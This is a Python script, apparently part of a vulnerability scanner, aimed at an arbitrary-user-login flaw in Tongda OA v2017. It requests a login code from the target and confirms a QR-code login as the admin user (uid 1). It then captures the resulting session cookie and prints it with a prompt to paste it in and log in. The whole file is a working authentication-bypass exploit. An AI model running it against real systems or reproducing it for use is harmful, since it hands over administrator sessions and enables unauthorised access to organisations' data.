import time
import requests
from rich.console import Console
import urllib3
import json

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    exp_url=target_url+'ispirit/login_code.php'
    console.print(now_time() + " [INFO]     正在检测通达OA_v2017_任意用户登录漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        resText = json.loads(response.text)
        codeUid = resText['codeuid']
        codeScanUrl = target_url+'general/login_code_scan.php'
        response = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers)
        resText = json.loads(response.text)
        status = resText['status']
        if status == str(1):
            getCodeUidUrl = target_url+'ispirit/login_code_check.php?codeuid='+codeUid
            response = requests.get(getCodeUidUrl)
            tmp_cookie = response.headers['Set-Cookie']
            headers["Cookie"] = tmp_cookie
            check_available = requests.get(target_url + 'general/index.php',headers=headers)
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    console.print(now_time() + ' [SUCCESS]  存在通达OA_v2017_任意用户登录漏洞,粘贴cookie尝试登录:{}'.format(tmp_cookie), style='bold green')
            
                else:
                    console.print(now_time() + " [WARNING]  不存在通达OA_v2017_任意用户登录漏洞", style='bold red')
            else:
                console.print(now_time() + " [WARNING]  不存在通达OA_v2017_任意用户登录漏洞", style='bold red')
    except: 
        console.print(now_time() + ' [WARNING]  未知错误，目标可能拒绝访问', style='bold red')          
            
        
